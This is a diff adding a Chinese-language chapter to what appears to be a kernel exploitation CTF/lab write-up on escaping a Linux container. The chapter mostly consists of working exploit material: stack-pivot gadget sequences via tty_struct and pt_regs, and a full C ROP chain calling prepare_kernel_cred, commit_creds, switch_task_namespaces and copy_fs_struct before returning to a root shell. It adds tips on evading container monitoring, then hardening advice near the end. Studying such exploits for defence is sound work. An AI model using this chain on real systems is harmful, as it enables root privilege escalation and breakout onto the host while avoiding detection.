+| r14 = push_rax_pop_rsp_add_rsp_0X20_ret|
+| ...                                    |
+---------------------------------------------
+| mov_rax_rdi_ret 执行位置                |
+---------------------------------------------
+| 寄存器转换完成，跳转到r14               |
+---------------------------------------------
+| push_rax_pop_rsp_add_rsp_0X20_ret 执行  |
+---------------------------------------------
+| 栈指针迁移到tty_struct结构体            |
+---------------------------------------------
+| tty_struct[4] = ADD_RSP_0X50_RET       |
+---------------------------------------------
+| 第三次栈调整，增加0x50字节              |
+---------------------------------------------
+| POP_RDI_RET 起始位置                   | ← ROP链起始
+| ROP链参数和gadget序列                  |
+---------------------------------------------
+```
+
+**控制流调整链的完整执行流程**：
+
+```mermaid
+graph TD
+    A[ioctl系统调用入口] --> B[保存寄存器到pt_regs]
+    B --> C[执行tty_struct->ops->ioctl]
+
+    C --> D[控制流转到ADD_RSP_0XF8_POP_RBX_RET]
+    D --> E[第一级栈迁移: add rsp, 0xf8]
+    E --> F[清理栈: pop rbx]
+    F --> G[跳转到pt_regs.r15: mov_rax_rdi_ret]
+
+    G --> H[寄存器转换: mov rax, rdi]
+    H --> I[跳转到pt_regs.r14: push_rax_pop_rsp_add_rsp_0X20_ret]
+
+    I --> J[压栈: push rax]
+    J --> K[栈指针重定位: pop rsp]
+    K --> L[栈调整: add rsp, 0x20]
+    L --> M["跳转到tty_struct[4]: ADD_RSP_0X50_RET"]
+
+    M --> N[第三级栈调整: add rsp, 0x50]
+    N --> O[跳转到POP_RDI_RET]
+
+    O --> P[ROP链起始: pop rdi; ret]
+    P --> Q[设置RDI=0]
+    Q --> R["调用prepare_kernel_cred(0)"]
+    R --> S[凭证创建完成，RAX=凭证指针]
+
+    S --> T[传递凭证指针到RDI]
+    T --> U["调用commit_creds(凭证)"]
+    U --> V[进程权限提升完成]
+
+    V --> W[命名空间切换流程]
+    W --> X[查找init进程任务结构]
+    X --> Y[获取init命名空间代理]
+    Y --> Z[切换到init命名空间]
+
+    Z --> AA[文件系统切换流程]
+    AA --> AB[复制init文件系统]
+    AB --> AC[替换当前进程的文件系统指针]
+
+    AC --> AD[准备返回用户空间]
+    AD --> AE[执行KPTI返回序列]
+    AE --> AF[返回用户空间执行目标函数]
+```
+
+**技术优势**：
+
+1. **绕过栈保护**：通过多级栈迁移技术，避免在原始栈帧上执行敏感操作
+2. **精确控制**：多级迁移确保栈指针最终定位到精确的目标位置
+3. **环境适应**：适应不同内核版本和配置的栈布局差异
+4. **可靠性高**：通过精确计算确保迁移过程的可预测性
+5. **灵活性**：通过`pt_regs`布局实现动态控制流转移
+
+**数学表达**：
+设初始栈指针为$$SP_0$$，经过多级迁移后的最终栈指针为$$SP_f$$，迁移过程可表示为：
+
+$$
+SP_1 = SP_0 + 0xF8 \quad \text{(第一级迁移)}
+$$
+
+$$
+SP_2 = RDI\_value \quad \text{(第二级迁移，RDI为tty_struct地址)}
+$$
+
+$$
+SP_3 = SP_2 + 0x20 \quad \text{(第二级调整)}
+$$
+
+$$
+SP_4 = SP_3 + 0x50 \quad \text{(第三级迁移)}
+$$
+
+$$
+SP_f = SP_4 \quad \text{(ROP链起始位置)}
+$$
+
+#### 6-4-2. pt_regs布局与寄存器管理
+
+`pt_regs`结构在内核栈中保存了系统调用进入内核时的用户空间寄存器状态。通过`trigger_exploit_chain`函数，可以预先设置这些寄存器的值，为控制流转移创造条件。
+
+**pt_regs结构布局**：
+
+```
+pt_regs结构（x86_64）：
+偏移0x00: r15
+偏移0x08: r14
+偏移0x10: r13
+偏移0x18: r12
+偏移0x20: rbp
+偏移0x28: rbx
+偏移0x30: r11
+偏移0x38: r10
+偏移0x40: r9
+偏移0x48: r8
+偏移0x50: rax
+偏移0x58: rcx
+偏移0x60: rdx
+偏移0x68: rsi
+偏移0x70: rdi
+偏移0x78: orig_rax
+偏移0x80: rip
+偏移0x88: cs
+偏移0x90: rflags
+偏移0x98: rsp
+偏移0xA0: ss
+```
+
+**关键寄存器设置**：
+在`trigger_exploit_chain`函数中，设置了以下关键寄存器：
+
+```c
+__asm__("mov r15,   mov_rax_rdi_ret;"      /* 用于第一级跳转后的控制流 */
+        "mov r14,   push_rax_pop_rsp_add_rsp_0X20_ret;"  /* 用于第二级栈迁移 */
+        /* 其他寄存器设置... */
+        "mov rdx,   0xdeadbeaf;"
+        "mov rsi,   0xdeadbeaf;"
+        "mov rdi,   victim_ptmx;" /* 触发ioctl syscall */
+        "syscall");
+```
+
+**寄存器设置策略**：
+
+1. **r15寄存器**：存储`mov_rax_rdi_ret` gadget地址，用于从`ADD_RSP_0XF8_POP_RBX_RET`跳转
+2. **r14寄存器**：存储`push_rax_pop_rsp_add_rsp_0X20_ret` gadget地址，用于从`mov_rax_rdi_ret`跳转
+3. **其他寄存器**：设置占位值，避免触发异常
+
+**控制流转移的寄存器流**：
+
+```
+寄存器状态流：
+rdi (tty_struct地址) → mov_rax_rdi_ret → rax (tty_struct地址)
+rax (tty_struct地址) → push_rax_pop_rsp_add_rsp_0X20_ret → rsp (栈指针)
+rsp (调整后) → ADD_RSP_0X50_RET → 最终栈位置
+```
+
+#### 6-4-3. 容器环境调整ROP链构建
+
+在容器环境下，控制流调整链不仅需要实现权限提升，还需要调整容器的命名空间和文件系统，实现容器环境的调整。以下是容器环境调整ROP链的关键组成部分：
+
+**控制流调整链结构**：
+
+```c
+/* 控制流调整链构建 */
+rop_chain[0] = 0x0000000100005401;  /* tty_struct->magic = 0x5401 */
+rop_chain[2] = target_object - 0x38;  /* tty_struct->driver，避免空指针解引用 */
+rop_chain[3] = target_object;  /* tty_struct->ops，指向自身 */
+rop_chain[4] = kernel_offset + ADD_RSP_0X50_RET;  /* 第三级栈调整gadget */
+rop_chain[12] = kernel_offset + ADD_RSP_0XF8_POP_RBX_RET;  /* 第一级栈迁移gadget */
+i = 15;
+/* ROP链：权限提升部分 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;  /* ROP链起始点 */
+rop_chain[i++] = 0;  /* prepare_kernel_cred参数 */
+rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;  /* 创建凭证 */
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0;  /* 复制长度参数 */
+rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET;
+rop_chain[i++] = 0;  /* RBX清理值 */
+rop_chain[i++] = 0;  /* RBP清理值 */
+rop_chain[i++] = 0;  /* R12清理值 */
+rop_chain[i++] = kernel_offset + COMMIT_CREDS;  /* 应用凭证 */
+
+/* ROP链：命名空间切换部分 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = 1;  /* init进程PID */
+rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;  /* 查找init进程 */
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + POP_RSI_RET;
+rop_chain[i++] = kernel_offset + INIT_NSPROXY;  /* init命名空间代理 */
+rop_chain[i++] = kernel_offset + SWITCH_TASK_NAMESPACES;  /* 切换命名空间 */
+
+/* ROP链：文件系统切换部分 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = kernel_offset + INIT_FS;  /* init文件系统 */
+rop_chain[i++] = kernel_offset + COPY_FS_STRUCT;  /* 复制文件系统结构 */
+rop_chain[i++] = kernel_offset + PUSH_RAX_POP_RBX_RET;  /* 保存新文件系统 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = getpid();  /* 当前进程PID */
+rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;  /* 查找当前进程 */
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0x6e0;  /* task_struct->fs偏移量 */
+rop_chain[i++] = kernel_offset + ADD_RAX_RCX_RET;  /* 计算fs指针位置 */
+rop_chain[i++] = kernel_offset + MOV_RAX_RBX_POP_RBX_RET;  /* 替换fs指针 */
+rop_chain[i++] = 0;  /* RBX清理值 */
+
+/* ROP链：返回用户空间部分 */
+rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+rop_chain[i++] = 0;  /* 备用栈指针 */
+rop_chain[i++] = 0;  /* 备用栈指针 */
+rop_chain[i++] = (uint64_t)get_root_shell;  /* 返回后执行的函数 */
+rop_chain[i++] = user_cs;  /* 用户代码段 */
+rop_chain[i++] = user_rflags;  /* 用户标志寄存器 */
+rop_chain[i++] = user_sp + 0x8;  /* 用户栈指针 */
+rop_chain[i++] = user_ss;  /* 用户栈段 */
+```
+
+**控制流调整链的模块化设计**：
+
+1. **权限提升模块**：
+    - 通过`prepare_kernel_cred(0)`创建root凭证
+    - 通过`commit_creds()`应用凭证到当前进程
+    - 包含必要的寄存器清理和参数传递
+
+2. **命名空间切换模块**：
+    - 查找init进程的任务结构体
+    - 获取init进程的命名空间代理
+    - 切换当前进程到init命名空间
+    - 突破容器的命名空间隔离
+
+3. **文件系统切换模块**：
+    - 复制init进程的文件系统结构
+    - 修改当前进程的文件系统指针
+    - 突破容器的文件系统隔离
+    - 确保文件系统访问权限
+
+4. **用户空间返回模块**：
+    - 处理KPTI（内核页表隔离）机制
+    - 恢复用户空间寄存器状态
+    - 安全返回到用户空间目标函数
+    - 确保控制流平滑过渡
+
+**ROP链执行流程优化**：
+
+- **寄存器重用**：尽可能重用已设置的寄存器值，减少额外设置
+- **栈平衡**：每个gadget执行后保持栈指针正确对齐
+- **错误恢复**：包含必要的错误检测和恢复机制
+- **性能优化**：减少不必要的gadget调用，提高执行效率
+
+#### 6-4-4. 命名空间切换技术
+
+在容器环境下，命名空间切换是实现容器环境调整的关键技术。通过切换到init进程的命名空间，可以突破容器的隔离限制。
+
+**命名空间切换原理**：
+
+1. **查找init进程**：通过`find_task_by_vpid(1)`获取init进程的`task_struct`
+2. **获取init命名空间**：从init进程获取`init_nsproxy`指针
+3. **切换命名空间**：调用`switch_task_namespaces(task, init_nsproxy)`将当前进程切换到init命名空间
+
+**命名空间类型**：
+容器环境下通常包含以下命名空间类型：
+
+- **PID命名空间**：进程ID隔离
+- **网络命名空间**：网络栈隔离
+- **挂载命名空间**：文件系统挂载点隔离
+- **UTS命名空间**：主机名和域名隔离
+- **IPC命名空间**：进程间通信隔离
+- **用户命名空间**：用户和组ID隔离
+
+**命名空间切换ROP链**：
+
+```c
+/* 查找init进程 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = 1;  /* init进程的PID */
+rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;
+
+/* 传递任务结构体 */
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_RDI_RSI_POP_RBX_POP_RBP_POP_R12_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+
+/* 准备init命名空间指针 */
+rop_chain[i++] = kernel_offset + POP_RSI_RET;
+rop_chain[i++] = kernel_offset + INIT_NSPROXY;
+
+/* 切换命名空间 */
+rop_chain[i++] = kernel_offset + SWITCH_TASK_NAMESPACES;
+```
+
+**命名空间切换效果**：
+
+- **进程可见性**：可以查看主机上的所有进程
+- **网络访问**：可以访问主机网络栈
+- **文件系统**：可以访问主机文件系统挂载点
+- **主机信息**：可以获取主机的主机名和域名
+
+#### 6-4-5. 文件系统切换技术
+
+在容器环境下，文件系统切换是实现完整容器环境调整的重要步骤。通过切换到init进程的文件系统，可以访问主机文件系统。
+
+**文件系统切换原理**：
+
+1. **复制init文件系统**：调用`copy_fs_struct(init_fs)`创建init文件系统的副本
+2. **获取当前任务结构**：通过`find_task_by_vpid(getpid())`获取当前进程的`task_struct`
+3. **替换文件系统指针**：将当前进程的`task_struct->fs`指针替换为新复制的文件系统结构
+
+**文件系统结构**：
+Linux内核中，每个进程都有一个`fs_struct`结构，包含根目录、当前工作目录、文件描述符表等信息。容器通过挂载命名空间实现文件系统隔离。
+
+**文件系统切换ROP链**：
+
+```c
+/* 复制init文件系统 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = kernel_offset + INIT_FS;
+rop_chain[i++] = kernel_offset + COPY_FS_STRUCT;
+rop_chain[i++] = kernel_offset + PUSH_RAX_POP_RBX_RET;  /* 保存新文件系统到RBX */
+
+/* 获取当前任务结构 */
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = getpid();
+rop_chain[i++] = kernel_offset + FIND_TASK_BY_VPID;  /* RAX = 当前任务结构 */
+
+/* 计算fs字段偏移 */
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0x6e0;  /* task_struct->fs偏移 */
+
+/* 修改fs字段 */
+rop_chain[i++] = kernel_offset + ADD_RAX_RCX_RET;  /* RAX = &current->fs */
+rop_chain[i++] = kernel_offset + MOV_RAX_RBX_POP_RBX_RET;  /* current->fs = 新文件系统 */
+rop_chain[i++] = 0;
+```
+
+**文件系统切换效果**：
+
+- **根目录访问**：可以访问主机文件系统的根目录
+- **文件操作**：可以在主机文件系统上执行文件操作
+- **设备访问**：可以访问主机设备文件
+- **挂载操作**：可以查看和操作主机的文件系统挂载
+
+#### 6-4-6. 容器环境调整触发
+
+在容器环境下，控制流调整的触发机制与前文相同，但需要考虑容器内可能存在的额外监控和检测机制。
+
+**控制流调整触发**：
+
+```c
+/* 触发控制流调整 */
+mov_rax_rdi_ret = kernel_offset + MOV_RAX_RDI_RET;
+push_rax_pop_rsp_add_rsp_0X20_ret = kernel_offset + PUSH_RAX_POP_RSP_ADD_RSP_0X20_RET;
+for (i = 0; i < 1024; i++) {
+    victim_ptmx = ptmx[i];
+    trigger_exploit_chain();
+}
+```
+
+**容器环境考虑**：
+
+- **监控检测**：容器运行时可能包含安全监控机制
+- **行为分析**：容器内的异常行为可能被检测
+- **日志记录**：容器内的系统调用可能被记录
+- **资源限制**：容器可能对系统调用频率有限制
+
+**触发优化策略**：
+
+1. **延迟触发**：在触发之间添加随机延迟，避免检测
+2. **分批触发**：将触发操作分批执行，减少资源使用
+3. **状态检查**：在触发过程中定期检查状态，成功则停止
+4. **错误处理**：完善的错误处理，避免异常暴露
+
+### 6-5. 容器环境下的关键技术特征
+
+#### 6-5-1. 多级栈迁移控制流技术
+
+容器环境下的多级栈迁移控制流技术是实现复杂环境调整的核心。通过精心设计的控制流转移序列，克服容器内可能存在的栈保护机制和内存布局限制。
+
+**栈迁移技术原理**：
+
+1. **渐进迁移**：通过多级gadget逐步迁移栈指针，避免大幅跳转触发检测
+2. **精确定位**：每级迁移都有精确的偏移计算，确保最终定位准确
+3. **状态保存**：在迁移过程中妥善保存和恢复寄存器状态
+4. **环境适应**：适应不同内核版本和容器环境的栈布局差异
+
+**技术实现细节**：
+
+- **偏移计算**：基于内核版本和配置精确计算每级迁移的偏移量
+- **栈对齐**：确保迁移后的栈指针满足对齐要求
+- **寄存器管理**：在迁移过程中妥善处理受影响的寄存器
+- **错误恢复**：包含错误检测和恢复机制，提高可靠性
+
+#### 6-5-2. 命名空间切换技术
+
+容器环境下的命名空间切换技术是实现容器环境调整的关键。通过切换到init进程的命名空间，突破容器的多维度隔离。
+
+**命名空间切换机制**：
+
+```
+容器进程命名空间切换流程：
+当前进程命名空间 → 查找init进程 → 获取init命名空间 → 切换命名空间 → init命名空间
+```
+
+**命名空间切换的技术挑战**：
+
+1. **地址获取**：需要获取`init_nsproxy`的准确地址
+2. **函数调用**：需要正确调用`switch_task_namespaces`函数
+3. **参数传递**：需要正确传递任务结构体和命名空间指针
+4. **权限检查**：需要绕过内核的权限检查机制
+
+**命名空间切换的实现细节**：
+
+- **init进程查找**：通过PID 1查找init进程的任务结构体
+- **命名空间获取**：从init进程的任务结构体中获取`nsproxy`指针
+- **切换函数调用**：调用内核函数完成命名空间切换
+- **状态验证**：验证命名空间切换是否成功
+
+#### 6-5-3. 文件系统切换技术
+
+文件系统切换技术是实现完整容器环境调整的关键。通过切换到init进程的文件系统，可以访问主机文件系统资源。
+
+**文件系统切换机制**：
+
+```
+容器文件系统切换流程：
+当前进程文件系统 → 复制init文件系统 → 获取当前任务结构 → 替换fs指针 → init文件系统
+```
+
+**文件系统切换的技术挑战**：
+
+1. **结构复制**：需要正确复制文件系统结构
+2. **指针替换**：需要准确替换任务结构体中的fs指针
+3. **引用计数**：需要正确处理文件系统结构的引用计数
+4. **同步问题**：需要避免文件系统访问的竞争条件
+
+**文件系统切换的实现细节**：
+
+- **文件系统复制**：通过`copy_fs_struct`函数复制init文件系统
+- **偏移计算**：精确计算`task_struct`中`fs`字段的偏移
+- **指针修改**：通过内存操作修改`fs`字段指针
+- **资源管理**：正确管理文件系统结构的生命周期
+
+#### 6-5-4. 容器环境感知技术
+
+容器环境下的技术实现需要感知容器环境特征，包括容器运行时、隔离机制、监控系统等。
+
+**容器环境感知机制**：
+
+1. **运行时检测**：检测容器运行时类型（Docker、containerd、CRI-O等）
+2. **隔离检查**：检查容器的隔离配置（命名空间、控制组、权能等）
+3. **监控分析**：分析容器内的监控和检测机制
+4. **资源评估**：评估容器的资源限制和可用资源
+
+**容器环境感知的实现**：
+
+- **文件系统分析**：通过文件系统特征识别容器环境
+- **进程树检查**：通过进程树结构识别容器
+- **命名空间检查**：检查命名空间配置和隔离状态
+- **控制组检查**：检查控制组配置和资源限制
+
+### 6-6. 技术路径对比
+
+本章节描述的容器环境调整技术与第三章和第五章的技术实现存在显著差异，主要体现在技术目标、实现机制和环境适应性等方面。下表详细对比了三种技术的主要特征：
+
+| 对比维度           | 第三章：基础权限调整                   | 第五章：高级结构利用                     | 第六章：容器环境调整                  |
+| ------------------ | -------------------------------------- | ---------------------------------------- | ------------------------------------- |
+| **技术目标**       | 进程权限提升                           | 进程权限提升                             | 容器隔离突破和环境调整                |
+| **信息泄露机制**   | 通过`user_key_payload`覆盖泄露内核地址 | 通过`user_key_payload`越界读取泄露堆地址 | 同第五章，但增加容器环境感知          |
+| **控制流调整链**   | 基础ROP链，权限提升                    | 复合结构利用链，权限提升                 | 扩展ROP链，包含命名空间和文件系统切换 |
+| **命名空间处理**   | 不处理命名空间                         | 不处理命名空间                           | 主动切换到init命名空间                |
+| **文件系统处理**   | 不处理文件系统                         | 不处理文件系统                           | 主动切换到init文件系统                |
+| **环境适应性**     | 通用系统环境                           | 通用系统环境                             | 容器环境优化                          |
+| **技术复杂度**     | 相对简单                               | 中等复杂度                               | 高复杂度                              |
+| **隐蔽性要求**     | 一般                                   | 一般                                     | 高，需避免容器监控检测                |
+| **成功率影响因素** | 堆喷数量、时序控制                     | 内存对齐、结构复合                       | 容器环境感知、命名空间处理            |
+| **适用场景**       | 传统系统环境                           | 有终端设备的系统                         | 容器化环境                            |
+| **防御对抗**       | 基础防护机制                           | 中级防护机制                             | 容器安全机制                          |
+
+### 6-7. 容器安全防御建议
+
+#### 6-7-1. 容器运行时安全加固
+
+基于本章节描述的技术实现，提出以下容器运行时安全加固建议：
+
+**命名空间加固**：
+
+1. **用户命名空间**：启用用户命名空间隔离，防止UID/GID映射利用
+2. **命名空间去特权**：移除不必要的命名空间权能
+3. **命名空间监控**：监控命名空间切换和修改操作
+4. **命名空间限制**：限制容器的命名空间操作能力
+
+**文件系统加固**：
+
+1. **只读根文件系统**：将容器根文件系统设置为只读
+2. **挂载限制**：限制容器的挂载操作能力
+3. **文件系统监控**：监控容器的文件系统操作
+4. **敏感路径保护**：保护主机敏感路径不被容器访问
+
+**设备访问控制**：
+
+1. **设备白名单**：只允许必要的设备访问
+2. **设备权限限制**：限制设备访问的权限
+3. **设备监控**：监控容器的设备访问操作
+4. **设备命名空间**：使用设备命名空间隔离设备访问
+
+#### 6-7-2. 内核安全机制增强
+
+针对本章节描述的技术，提出以下内核安全机制增强建议：
+
+**内存安全增强**：
+
+1. **堆随机化强化**：增强SLUB分配器的随机化机制
+2. **内存布局保护**：保护关键数据结构的内存布局
+3. **内存访问监控**：监控异常的内存访问模式
+4. **释放后使用防护**：增强释放后使用检测和防护
+
+**控制流保护**：
+
+1. **函数指针保护**：保护关键的函数指针不被篡改
+2. **控制流完整性**：实施控制流完整性保护
+3. **ROP防护**：增强ROP链的检测和防护
+4. **执行流监控**：监控异常的执行流转移
+
+**命名空间安全**：
+
+1. **命名空间切换防护**：增强命名空间切换的安全检查
+2. **命名空间权限控制**：细化命名空间操作的权限控制
+3. **命名空间监控**：监控命名空间状态变化
+4. **命名空间隔离增强**：增强命名空间间的隔离机制
+
+#### 6-7-3. 运行时安全监控
+
+基于技术实现的特征，提出以下运行时安全监控建议：
+
+**行为监控**：
+
+1. **系统调用监控**：监控容器的系统调用模式和频率
+2. **内存操作监控**：监控异常的内存分配和释放操作
+3. **文件操作监控**：监控容器的文件系统操作
+4. **网络操作监控**：监控容器的网络访问行为
+
+**异常检测**：
+
+1. **行为异常检测**：检测容器的异常行为模式
+2. **资源异常检测**：检测容器的异常资源使用
+3. **权限异常检测**：检测容器的权限异常变化
+4. **状态异常检测**：检测容器的状态异常变化
+
+**审计日志**：
+
+1. **完整审计**：记录容器的完整操作日志
+2. **安全事件**：记录安全相关的事件和告警
+3. **行为分析**：对审计日志进行行为分析
+4. **追溯调查**：支持安全事件的追溯调查
+
+### 6-8. 技术总结
+
+本章节描述的容器环境调整技术代表了在容器化环境下的高级内核内存操作实践。通过`tty_struct`结构利用、命名空间切换、文件系统替换等多维度技术，实现了从容器内部到主机环境的完整调整路径。技术实现不仅需要精确控制内核内存布局和构建复杂的控制流调整链，还需要深入理解容器隔离机制和内核子系统交互，展现了在复杂环境下的系统工程能力。
+
+从技术架构角度看，这种实现展示了多级数据结构利用、跨命名空间操作、文件系统切换和环境感知调整的技术特征。从工程实践角度看，实现体现了容器环境适配、资源优化管理、错误处理完善和隐蔽性设计等软件工程原则。从系统安全角度看，这种技术实现揭示了现代容器安全中命名空间保护、文件系统隔离、控制流完整性和运行时监控等机制的重要性。
+
+通过对容器环境的深度感知和适应，结合精确的内存操作和复杂的控制流调整，本章节为理解容器环境下的高级内核操作技术提供了完整的技术视角和工程实践范例，为容器安全研究和防御技术发展提供了重要的技术参考。
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/OffByOne3
 https://github.com/BinRacer/pwn4kernel/tree/master/src/OffByOne2
+https://github.com/BinRacer/pwn4kernel/tree/master/src/OffByOne4
 https://bsauce.github.io/2022/11/11/CoRJail/
